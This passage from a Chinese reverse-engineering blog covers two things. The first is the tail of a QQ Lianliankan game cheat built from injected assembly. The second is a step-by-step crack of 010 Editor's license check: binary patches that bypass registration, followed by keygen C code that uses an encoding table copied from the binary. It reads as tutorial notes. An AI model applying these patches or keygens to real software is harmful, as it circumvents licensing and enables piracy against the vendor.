PUSH EAX;  参数3：点1坐标（eax来自local5，就是点坐标</span></span><br><span class="line">	<span class="comment">//0041AB1F | .  0FB645 08     MOVZX EAX, BYTE PTR SS : [EBP + 0x8];  eax = 0</span></span><br><span class="line">	<span class="comment">//0041AB23 | .  69C0 DC000000 IMUL EAX, EAX, 0xDC;  eax = 0</span></span><br><span class="line">	<span class="comment">//0041AB29 | .  8D8430 5C1900 &gt; LEA EAX, DWORD PTR DS : [EAX + ESI + 0x195C]</span></span><br><span class="line">	<span class="comment">//0041AB30 | .  50            PUSH EAX;  参数2：连连看数组地址（ = 12BB50 = ？ + ？</span></span><br><span class="line">	<span class="comment">//0041AB31 | .FF75 08       PUSH[ARG.1];  参数1：0（栈中可得，arg1为0</span></span><br><span class="line">	<span class="comment">//0041AB34 | .E8 551B0000   CALL kyodai2.0041C68E;  6个参数，相当靠谱，就是他了</span></span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 传递ecx，尤其重要，基地址！！</span></span><br><span class="line">		mov ecx, <span class="number">0x45DEBC</span></span><br><span class="line">		mov ecx, [ecx]</span><br><span class="line">		<span class="comment">// 第一个参数 固定值</span></span><br><span class="line">		push <span class="number">0x4</span></span><br><span class="line">		<span class="comment">// 第二个参数 坐标点数组</span></span><br><span class="line">		lea eax, DWORD PTR DS : [ecx + <span class="number">0x494</span>]</span><br><span class="line">		mov eax, DWORD PTR DS : [eax + <span class="number">0x19F0</span>]</span><br><span class="line">		add eax, <span class="number">0x40</span></span><br><span class="line">		push eax</span><br><span class="line">		<span class="comment">// 第三个参数 坐标1</span></span><br><span class="line">		lea eax, pt1.x</span><br><span class="line">		push eax</span><br><span class="line">		<span class="comment">// 第四个参数  坐标2</span></span><br><span class="line">		lea eax, pt2.x</span><br><span class="line">		push eax</span><br><span class="line">		<span class="comment">// 第五个参数 数组地址</span></span><br><span class="line">		lea eax, DWORD PTR DS : [ecx + <span class="number">0x494</span>]</span><br><span class="line">		mov eax, DWORD PTR DS : [eax + <span class="number">0x19F0</span>]</span><br><span class="line">		mov eax, DWORD PTR DS : [eax + <span class="number">4</span>]</span><br><span class="line">		push eax</span><br><span class="line">		<span class="comment">// 第六个参数 0</span></span><br><span class="line">		push <span class="number">0</span></span><br><span class="line">		<span class="comment">// 调用函数</span></span><br><span class="line">		mov eax,<span class="number">0x0041C68E</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hWnd, Msg, wParam, lParam);<span class="comment">// 要加此，否则运行完自动结束</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Msg == WM_DATA3)</span><br><span class="line">&#123;</span><br><span class="line">  OutputDebugString(<span class="string">L"无限炸弹"</span>);</span><br><span class="line">  <span class="comment">//0041DE4D | .  8B86 9404000 &gt; MOV EAX, DWORD PTR DS : [ESI + 0x494]</span></span><br><span class="line">  <span class="comment">//0041DE53 | .  8D8E 9404000 &gt; LEA ECX, DWORD PTR DS : [ESI + 0x494]</span></span><br><span class="line">  <span class="comment">//0041DE59 | .  52           PUSH EDX</span></span><br><span class="line">  <span class="comment">//0041DE5A | .  53           PUSH EBX</span></span><br><span class="line">  <span class="comment">//0041DE5B | .  53           PUSH EBX</span></span><br><span class="line">  <span class="comment">//0041DE5C | .FF50 28      CALL DWORD PTR DS : [EAX + 0x28];  使用指南针道具</span></span><br><span class="line">  _asm</span><br><span class="line">  &#123;</span><br><span class="line">    mov ecx, <span class="number">0x45DEBC</span></span><br><span class="line">      mov ecx, [ecx]</span><br><span class="line">      LEA ECX, DWORD PTR DS : [ecx + <span class="number">0x494</span>]</span><br><span class="line">    PUSH <span class="number">0xF4</span><span class="comment">// 若指南针，则F0</span></span><br><span class="line">      PUSH <span class="number">0</span></span><br><span class="line">      PUSH <span class="number">0</span></span><br><span class="line">      mov eax, <span class="number">0x0041E691</span></span><br><span class="line">      call eax</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> DefWindowProc(hWnd, Msg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CallWindowProc(g_oldProc,hWnd,Msg,wParam,lParam);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2-7-最终效果"><a href="#2-7-最终效果" class="headerlink" title="2.7-最终效果"></a>2.7-最终效果</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115408.jpg" alt></p>
<ul>
<li>外挂地址：<a href="https://github.com/21Gun5/QQllkGamePlugin" target="_blank" rel="noopener">https://github.com/21Gun5/QQllkGamePlugin</a></li>
</ul>
<h1 id="03-参考"><a href="#03-参考" class="headerlink" title="03-参考"></a>03-参考</h1><ol>
<li>15PB视频课程-逆向工程实战之连连看分析</li>
</ol>
<p>PS：流水账的写法，图片说明较少，简单为日后翻看方便</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257696.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257696.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>软件破解</tag>
      </tags>
  </entry>
  <entry>
    <title>010editor注册机</title>
    <url>/2019/11/14/reverse/010editor%E6%B3%A8%E5%86%8C%E6%9C%BA/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="01-样本概况"><a href="#01-样本概况" class="headerlink" title="01-样本概况"></a>01-样本概况</h1><h2 id="1-1-应用程序信息"><a href="#1-1-应用程序信息" class="headerlink" title="1.1-应用程序信息"></a>1.1-应用程序信息</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">文件: <span class="number">010</span>Editor.exe</span><br><span class="line">大小: <span class="number">46891744</span> bytes</span><br><span class="line">文件版本:<span class="number">8.0</span><span class="number">.1</span></span><br><span class="line">修改时间: <span class="number">2019</span>年<span class="number">11</span>月<span class="number">12</span>日, <span class="number">21</span>:<span class="number">05</span>:<span class="number">55</span></span><br><span class="line">MD5: <span class="number">67399</span>A3650BE615DF420393758C799CD</span><br><span class="line">SHA1: <span class="number">95</span>CC3DBFEF9781C73D147C44E179EDBAFAC37F42</span><br><span class="line">CRC32: <span class="number">8</span>A47BA40</span><br></pre></td></tr></table></figure>
<h2 id="1-2-分析环境及工具"><a href="#1-2-分析环境及工具" class="headerlink" title="1.2-分析环境及工具"></a>1.2-分析环境及工具</h2><ul>
<li>系统环境: Windows10-64位、Windows7-32位</li>
<li>工具: 010Editor、OllyDebug、IDA、VS 2017<a id="more"></a></li>
</ul>
<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3-分析目标"></a>1.3-分析目标</h2><ul>
<li>暴力破解，防止注册弹框</li>
<li>分析算法，实现注册机</li>
<li>暴力破解，去除网络验证</li>
</ul>
<h1 id="02-具体分析过程"><a href="#02-具体分析过程" class="headerlink" title="02-具体分析过程"></a>02-具体分析过程</h1><h2 id="2-1-暴力破解"><a href="#2-1-暴力破解" class="headerlink" title="2.1-暴力破解"></a>2.1-暴力破解</h2><h3 id="2-1-1-修改JNZ"><a href="#2-1-1-修改JNZ" class="headerlink" title="2.1.1-修改JNZ"></a>2.1.1-修改JNZ</h3><ol>
<li><p>（弹窗，有4类相关API：CreateWindow、CreateDialog、DialogBox、MessageBox</p>
</li>
<li><p>（QT同MFC，也是一种界面库，不管库里有什么函数，其根本都是调用了Windows系统中USER32.dll中的API</p>
</li>
<li><p>（QT编写的界面程序，不了解其库函数不碍事，反正底层都是调用Windows的API</p>
</li>
<li><p>（经验：QT中弹窗一般都是调用了CreateWindow，若实在不知道，就4类API依次下断点，反复测试</p>
</li>
<li><p>OD附加010，ctrl+g搜索CreateWindowA/W、下断、运行，断在75B6E9CC W版处</p>
</li>
<li><p>（CreateWindow是一个很常用的底层API，不仅仅是注册弹窗时会用到，程序运行时好多地方都可能会调用，因此，若在测试时发现断下了，而并没有点击check-license，F9放行这些无关的即可</p>
</li>
<li><p>（010程序太大，OD打开太卡，最好附加）</p>
</li>
<li><p>此时，K-查看调用堆栈，看究竟是哪调用了这个API</p>
</li>
<li><p>（调用来自那一栏，只看是主模块010Edito的调用，其他的不管</p>
</li>
<li><p>依次点进去，简单看一下哪个里面有相关字符串，发现主模块中第三个调用，即地址=00169B54，调用来自=010Edito.00C65B29的那一个</p>
</li>
<li><p>双击进入，到00C65B29处，下断， 再次check-license测试，果然断在此处</p>
</li>
<li><p>找到弹出失败的地方（根据字符串），不断向上找，得到两个关键函数、直接跳向失败/成功的跳转（按照CrackMe的思路来找；前面地址不确定，每次运行会变化</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115434.jpg" alt="image-20200215175153013"></p>
</li>
<li><p>将JNZ关键跳转直接NOP，另保存为文件010Editor1.exe，运行时仍旧弹出注册框，点击check后可显示已经成功</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115433.jpg" alt="image-20200215175216879"></p>
</li>
<li><p>JNZ改NOP可实现，粗暴简单，但仍会弹注册框，美中不足，若要改进就得深究那两个关键函数</p>
</li>
</ol>
<h3 id="2-1-2-更完美的爆破"><a href="#2-1-2-更完美的爆破" class="headerlink" title="2.1.2-更完美的爆破"></a>2.1.2-更完美的爆破</h3><ul>
<li>ebx != e7那个函数下断，F7进入，看返回值eax会有几种情况：</li>
<li>mov eax,93、mov eax,e7、mov eax,esi，继续看 esi 来自哪：有4e、2D、E7几种情况</li>
<li>edi = db 那个函数下断，F7进入，看eax=db怎么才成立<ul>
<li>有一个mov eax,db</li>
<li>往上找是一个JE跳转，cmp eax,2D，即比较上面的call的返回值</li>
<li>观察得，此处的call同ebx != e7是同一个call，都是0029A826，</li>
</ul>
</li>
<li><p>如此，这两个关键函数就建立了关系</p>
<ul>
<li>只要函数1的eax == 2D，自然满足本身 != e7的条件</li>
<li>只要其能一直==2D，那么在函数2的内部，就能通过JE跳转，使得函数2的eax = db</li>
<li>一下子都满足了条件，最终就会成功，因此让其一直==2D是关键</li>
<li>（注意，不仅仅是让函数1本身eax==2D，而且要让函数2的内部中，函数1的eax也==2D，就是让函数1的返回值恒== 2D，啰哩啰嗦的。。。</li>
<li>其实上句话完全多余，调用的是0029A826这个函数，如果修改其，就相当于修改了函数定义，不管在哪调用，结果都是一样的</li>
</ul>
</li>
<li><p>更完美的暴力破解，</p>
<ul>
<li><p>F7进入0029A826函数的内部，直接mov eax,0x2D ; retn 8即可（正常就是retn 8 为了栈平衡</p>
</li>
<li><p>有时修改时，原OPCODE中有下划线，说明可能发生地址重定位，可以利用010Editor，修改PE中相关字段，关闭重定位功能（扩展头-DllCharactertistics-DYNAMIC_BASE，将其置为0</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115429.jpg" alt="image-20200215175426008"></p>
</li>
<li><p>最终修改为，</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115425.jpg" alt="image-20200215175450859"></p>
</li>
</ul>
</li>
<li><p>选中这四行-右键-复制到可执行文件-所有修改-保存文件，命名为：010Editor_cracked</p>
</li>
</ul>
<h3 id="2-1-3-小结"><a href="#2-1-3-小结" class="headerlink" title="2.1.3-小结"></a>2.1.3-小结</h3><ul>
<li><p>要想实现比较完美的暴力破解，需要修改两个地方：</p>
<ul>
<li>关键函数1内部</li>
<li>JNZ</li>
</ul>
</li>
<li><p>暴力破解后，原程序打开提示已过期，打不开了 </p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115443.jpg" alt="image-20200215175515930"></p>
</li>
<li><p>除了API下断点-栈回溯外，还可搜索字符串，找到目标位置，两种方法各有千秋，不拘泥方法，能找到地就行</p>
</li>
</ul>
<h2 id="2-2-关键函数分析-算法前"><a href="#2-2-关键函数分析-算法前" class="headerlink" title="2.2-关键函数分析-算法前"></a>2.2-关键函数分析-算法前</h2><ul>
<li>打开原来程序，OD附加（而非破解后的版本），重点分析eax=2d 那个函数</li>
<li><p>分析一个函数，要关注其传入及传出</p>
<ul>
<li>传入：push了什么、call之前是否赋值了寄存器环境，如thiscall中的ecx</li>
<li>传出：是否修改了某内存、返回值eax</li>
</ul>
</li>
<li><p>此call大概率会传入name和pass，以验证</p>
</li>
<li><p>传入</p>
<ul>
<li><p>push了两个立即数：4389、9，暂未知何意义</p>
</li>
<li><p>call之前mov ecx，数据窗口中跟随ecx的值</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115435.jpg" alt="image-20200215175617955"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>ecx中是啥？（内存窗口中-右键-长型-地址，显示1列数据，便于观察</p>
<ul>
<li>数据窗口跟随1、4，并未发现有用数据</li>
<li>跟随2、3，发现有00xx形式，unicode字符，右键-hex-16字节/unicode，观察数据，发现是键入的name和pass</li>
<li>传入了name和pass，再调用这个call，符合逻辑</li>
</ul>
</li>
<li><p>F7进入，逐行分析（不求弄懂每一句具体代码，但求其实现了什么</p>
<ul>
<li><p>函数内call函数，不必每个都进，根据出入判断其功能；</p>
</li>
<li><p>push进函数一个地址，call之后看函数对他干了啥</p>
</li>
<li><p>最好记下call之前的样子，便于对比，如下是013BDC30 处的call，这是eax之前的样子/之后的样子，eax返回0，并没看出干了啥，先放着，不深究</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115423.jpg" alt="image-20200215175704016"></p>
</li>
</ul>
</li>
<li><p>OD中重要注释</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115438.jpg" alt="image-20200215175722775"></p>
</li>
</ul>
<h2 id="2-3-算法部分-初步序列号"><a href="#2-3-算法部分-初步序列号" class="headerlink" title="2.3-算法部分-初步序列号"></a>2.3-算法部分-初步序列号</h2><ul>
<li>小技巧：若不想跳转实现，可手动设置新的EIP</li>
<li><p>MOVZX A,B </p>
<ul>
<li>B 空间必须小于 A</li>
<li>用0来扩展填充A的余下空间</li>
<li>相当于 &amp; 0xFF</li>
<li>如movzx ecx, al 即 ecx = al &amp; 0xFF，若后面是ax，则0xFFFF（几个F根据其几个字节而定</li>
<li>就是普通mov + 高位填充0</li>
</ul>
</li>
<li><p>CDQ指令</p>
<ul>
<li>把 EAX 的第 31 bit 复制到 EDX 的每一个 bit 上。 </li>
<li>大多出现在除法运算之前</li>
<li>它实际的作用只是把EDX的所有位都设成EAX最高位的值</li>
<li>也就是说，当EAX &lt;80000000, EDX 为00000000；</li>
<li>当EAX &gt;= 80000000， EDX 则为FFFFFFFF</li>
</ul>
</li>
<li><p>OD注释：算法部分（先不管其内部原理，能跟着走下来，看最终的公式</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115436.jpg" alt="image-20200215175828488"></p>
</li>
<li><p>第一个call内部</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115444.jpg" alt="image-20200215175844999"></p>
</li>
<li><p>第二个call内部</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115441.jpg" alt="image-20200215175859025"></p>
</li>
</ul>
<ul>
<li><p>有三个条件需要满足</p>
<ul>
<li>第一个JE前，ecx 不可为0</li>
<li>第二个JE前，eax 不可为0</li>
<li>JA前，eax 不可大雨0x3e8</li>
</ul>
</li>
<li><p>第一个JE前，ecx 不可为0</p>
<ul>
<li>来源：ecx来自edi+0x1c、来自eax、来自AL，即第一个call的返回值</li>
<li>第一个call内部，al = (k0 ^ k6 ^ 0x18 + 0x3D) ^ 0xA7;（如图函数内部</li>
<li>最终：al =(k0 ^ k6 ^ 0x18 + 0x3D) ^ 0xA7 !=0</li>
</ul>
</li>
<li><p>第二个JE前，eax 不可为0</p>
<ul>
<li>来源：eax来自ax，即第二个call的返回值</li>
<li>第二个call内部：eax返回值有两种情况，0 or 商（对应余数为0/非0）</li>
<li>最终：余数 == 0 即可（=0，返回商，必然eax不为0</li>
</ul>
</li>
<li><p>JA，eax 不可大于 0x3e8</p>
<ul>
<li>由上，余数==0，返回商，也就保证了返回值eax 不为0</li>
<li>最终：若要满足此，只要保证 商&lt;=0x3e8</li>
</ul>
</li>
<li><p>生成序列号的代码-注册机（初步序列号，只满足JE、JE、JA三个条件，后面的还没看</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 设置随机数种子</span></span><br><span class="line">  srand(time(<span class="literal">NULL</span>));</span><br><span class="line">  <span class="comment">// 密码字符串转为16进制字节数组、K[3]只可为9C/FC/AC</span></span><br><span class="line">  byte K[<span class="number">10</span>] = &#123; <span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>,<span class="number">0x9C</span>,<span class="number">0x55</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0x99</span>,<span class="number">0xAA</span> &#125;;</span><br><span class="line">  <span class="comment">// 第一个call中：处理k[0]、k[6]</span></span><br><span class="line">  <span class="comment">// AL= (k[0]^k[6]^0x18 + 0x3D) ^ 0xA7</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 随机生成k0、k6（小于0xFF</span></span><br><span class="line">    byte k0 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    byte k6 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    <span class="comment">// 使用k0、k6构造 al</span></span><br><span class="line">    byte al = (k0 ^ k6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line">    <span class="comment">// 若满足第一个JE前的条件，则保存</span></span><br><span class="line">    <span class="keyword">if</span> (al != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      K[<span class="number">0</span>] = k0;</span><br><span class="line">      K[<span class="number">6</span>] = k6;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 第二个call中：处理 K[1]、K[7]、k[2]、k[5] </span></span><br><span class="line">  <span class="comment">// esi = (((K[1] ^ K[7]) ^ 0xFF) * 0x100 + k[2] ^ k[5] &amp; 0xFF) &amp; 0xFFFF</span></span><br><span class="line">  <span class="comment">// eax =(((eax^0x7892)+0x4d30)^0x3421) &amp;0xFFFF</span></span><br><span class="line">  <span class="comment">// edx = 余数；判断是否为0: 为0返回eax=商、不为0返回eax=0</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 随机生成k1、7、2、5（小于0xFF</span></span><br><span class="line">    byte k1 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    byte k7 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    byte k2 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    byte k5 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">    <span class="comment">// 使用k1、7、2、5构造esi，即第二个call传入的参数，在call内部先提取到eax中</span></span><br><span class="line">    DWORD esi = (((k1 ^ k7) &amp; <span class="number">0xFF</span>) * <span class="number">0x100</span> + k2 ^ k5 &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="comment">// 通过传入的参数构造eax，即后面除法中的被除数</span></span><br><span class="line">    DWORD eax = (((esi ^ <span class="number">0x7892</span>) + <span class="number">0x4d30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="comment">// 余数为0返回商，也就满足返回值不等于0，同时指定 商即返回值&lt;= 0x3EB（同时满足后面两个条件，则保存</span></span><br><span class="line">    <span class="keyword">if</span> (eax % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; eax/<span class="number">0xB</span> &lt;= <span class="number">0x3EB</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      K[<span class="number">1</span>] = k1;</span><br><span class="line">      K[<span class="number">7</span>] = k7;</span><br><span class="line">      K[<span class="number">2</span>] = k2;</span><br><span class="line">      K[<span class="number">5</span>] = k5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 从若干随机值中，取出满足三个条件的值（两个JE的一个JA的）</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X"</span>,K[<span class="number">0</span>], K[<span class="number">1</span>], K[<span class="number">2</span>], K[<span class="number">3</span>], K[<span class="number">4</span>],K[<span class="number">5</span>], K[<span class="number">6</span>], K[<span class="number">7</span>], K[<span class="number">8</span>], K[<span class="number">9</span>]);</span><br><span class="line">  <span class="comment">// 不止一种情况，如：049B-CC9C-5508-8609-99AA</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>经过验证，满足三个条件，均没有发生跳转（跳了就失败了</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115439.jpg" alt="image-20200215180236757"></p>
</li>
</ul>
<h2 id="2-4-最终序列号-name和pass对应"><a href="#2-4-最终序列号-name和pass对应" class="headerlink" title="2.4-最终序列号-name和pass对应"></a>2.4-最终序列号-name和pass对应</h2><ul>
<li><p>lea eax[local.x]; push eax; call xxx：这种形式，将局部变量push进函数，一般是作为传出变量的，即call之后，修改eax（联想传指针间接修改值</p>
</li>
<li><p>如图，eax跟随窗口地址，call之后，发生改变，进一步跟随，发现name字符串转为ascii</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115431.jpg" alt="image-20200215180303309"></p>
</li>
<li><p>SETNE指令</p>
<ul>
<li>setne x：if ZF=0 set x =0</li>
<li>sete x：if ZF=1 set x =0</li>
</ul>
</li>
<li><p>遇到push xxx; call yyy ：不一定二者是对应的，可能push对应的是后面的call，要想知道call中究竟push了几个，看相邻的call内部是怎么平衡堆栈的，看这几个push是怎么被这几个call瓜分的</p>
</li>
<li><p>OD注释：版本1成功后跳过来的，关键的函数是第三个，即对name字符串加密的那个</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115437.jpg" alt="image-20200215180342991"></p>
</li>
</ul>
<h2 id="2-5-注册机v2的编写"><a href="#2-5-注册机v2的编写" class="headerlink" title="2.5-注册机v2的编写"></a>2.5-注册机v2的编写</h2><ul>
<li>在v1基础上，通过对上述04的分析，改进</li>
<li><p>需要将name字符串传入402e50的加密函数，从而得到加密值，那个函数怎么获得？</p>
<ul>
<li>可以F7进去，看他是怎么实现的，自己用代码复现（但是太麻烦了</li>
<li>简便方法：直接考出来即可</li>
</ul>
</li>
<li><p>怎么拷贝出来</p>
<ul>
<li>F7进入，在函数开始前（即push ebp），shift + x复制地址，得013BD120 </li>
<li>IDA中打开，g到达那个地址，F5看C代码（要等待其分析完才可，左下角不动了就行了</li>
<li>可见：其用到了一个数组，只要将此数组以及此代码拷贝出来即可</li>
</ul>
</li>
<li><p>IDA看这个数组有点乱，获取其地址2E64148，在OD中将其拷出来</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115440.jpg" alt="image-20200215180432904"></p>
</li>
<li><p>数据窗口右键-数据转换（插件实现的）-C++ - Dword（选啥都行，但是IDA中看到那个数组是Dword开头，就选dword吧）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115426.jpg" alt="image-20200215180452098"></p>
</li>
<li><p>将其粘贴到VS中，作为加密要用到的数组，如图</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115432.jpg" alt="image-20200215180509359"></p>
</li>
<li><p>可以直接在IDA中将C代码拷出来</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115427.jpg" alt="image-20200215180530614"></p>
</li>
</ul>
<p>·    可以直接在IDA中将C代码拷出来</p>
<ul>
<li><p>最终代码</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从OD拷贝出来的用于加密的数组</span></span><br><span class="line">DWORD g_EncodeArray[]=&#123;</span><br><span class="line">	<span class="number">0x39cb44b8</span>, <span class="number">0x23754f67</span>, <span class="number">0x5f017211</span>, <span class="number">0x3ebb24da</span>, <span class="number">0x351707c6</span>, <span class="number">0x63f9774b</span>, <span class="number">0x17827288</span>, <span class="number">0x0fe74821</span>, <span class="number">0x5b5f670f</span>, <span class="number">0x48315ae8</span>, <span class="number">0x785b7769</span>, <span class="number">0x2b7a1547</span>, <span class="number">0x38d11292</span>, <span class="number">0x42a11b32</span>, <span class="number">0x35332244</span>, <span class="number">0x77437b60</span>,</span><br><span class="line">	<span class="number">0x1eab3b10</span>, <span class="number">0x53810000</span>, <span class="number">0x1d0212ae</span>, <span class="number">0x6f0377a8</span>, <span class="number">0x43c03092</span>, <span class="number">0x2d3c0a8e</span>, <span class="number">0x62950cbf</span>, <span class="number">0x30f06ffa</span>, <span class="number">0x34f710e0</span>, <span class="number">0x28f417fb</span>, <span class="number">0x350d2f95</span>, <span class="number">0x5a361d5a</span>, <span class="number">0x15cc060b</span>, <span class="number">0x0afd13cc</span>, <span class="number">0x28603bcf</span>, <span class="number">0x3371066b</span>,</span><br><span class="line">	<span class="number">0x30cd14e4</span>, <span class="number">0x175d3a67</span>, <span class="number">0x6dd66a13</span>, <span class="number">0x2d3409f9</span>, <span class="number">0x581e7b82</span>, <span class="number">0x76526b99</span>, <span class="number">0x5c8d5188</span>, <span class="number">0x2c857971</span>, <span class="number">0x15f51fc0</span>, <span class="number">0x68cc0d11</span>, <span class="number">0x49f55e5c</span>, <span class="number">0x275e4364</span>, <span class="number">0x2d1e0dbc</span>, <span class="number">0x4cee7ce3</span>, <span class="number">0x32555840</span>, <span class="number">0x112e2e08</span>,</span><br><span class="line">	<span class="number">0x6978065a</span>, <span class="number">0x72921406</span>, <span class="number">0x314578e7</span>, <span class="number">0x175621b7</span>, <span class="number">0x40771dbf</span>, <span class="number">0x3fc238d6</span>, <span class="number">0x4a31128a</span>, <span class="number">0x2dad036e</span>, <span class="number">0x41a069d6</span>, <span class="number">0x25400192</span>, <span class="number">0x00dd4667</span>, <span class="number">0x6afc1f4f</span>, <span class="number">0x571040ce</span>, <span class="number">0x62fe66df</span>, <span class="number">0x41db4b3e</span>, <span class="number">0x3582231f</span>,</span><br><span class="line">	<span class="number">0x55f6079a</span>, <span class="number">0x1ca70644</span>, <span class="number">0x1b1643d2</span>, <span class="number">0x3f7228c9</span>, <span class="number">0x5f141070</span>, <span class="number">0x3e1474ab</span>, <span class="number">0x444b256e</span>, <span class="number">0x537050d9</span>, <span class="number">0x0f42094b</span>, <span class="number">0x2fd820e6</span>, <span class="number">0x778b2e5e</span>, <span class="number">0x71176d02</span>, <span class="number">0x7fea7a69</span>, <span class="number">0x5bb54628</span>, <span class="number">0x19ba6c71</span>, <span class="number">0x39763a99</span>,</span><br><span class="line">	<span class="number">0x178d54cd</span>, <span class="number">0x01246e88</span>, <span class="number">0x3313537e</span>, <span class="number">0x2b8e2d17</span>, <span class="number">0x2a3d10be</span>, <span class="number">0x59d10582</span>, <span class="number">0x37a163db</span>, <span class="number">0x30d6489a</span>, <span class="number">0x6a215c46</span>, <span class="number">0x0e1c7a76</span>, <span class="number">0x1fc760e7</span>, <span class="number">0x79b80c65</span>, <span class="number">0x27f459b4</span>, <span class="number">0x799a7326</span>, <span class="number">0x50ba1782</span>, <span class="number">0x2a116d5c</span>,</span><br><span class="line">	<span class="number">0x63866e1b</span>, <span class="number">0x3f920e3c</span>, <span class="number">0x55023490</span>, <span class="number">0x55b56089</span>, <span class="number">0x2c391fd1</span>, <span class="number">0x2f8035c2</span>, <span class="number">0x64fd2b7a</span>, <span class="number">0x4ce8759a</span>, <span class="number">0x518504f0</span>, <span class="number">0x799501a8</span>, <span class="number">0x3f5b2cad</span>, <span class="number">0x38e60160</span>, <span class="number">0x637641d8</span>, <span class="number">0x33352a42</span>, <span class="number">0x51a22c19</span>, <span class="number">0x085c5851</span>,</span><br><span class="line">	<span class="number">0x032917ab</span>, <span class="number">0x2b770ac7</span>, <span class="number">0x30ac77b3</span>, <span class="number">0x2bec1907</span>, <span class="number">0x035202d0</span>, <span class="number">0x0fa933d3</span>, <span class="number">0x61255df3</span>, <span class="number">0x22ad06bf</span>, <span class="number">0x58b86971</span>, <span class="number">0x5fca0de5</span>, <span class="number">0x700d6456</span>, <span class="number">0x56a973db</span>, <span class="number">0x5ab759fd</span>, <span 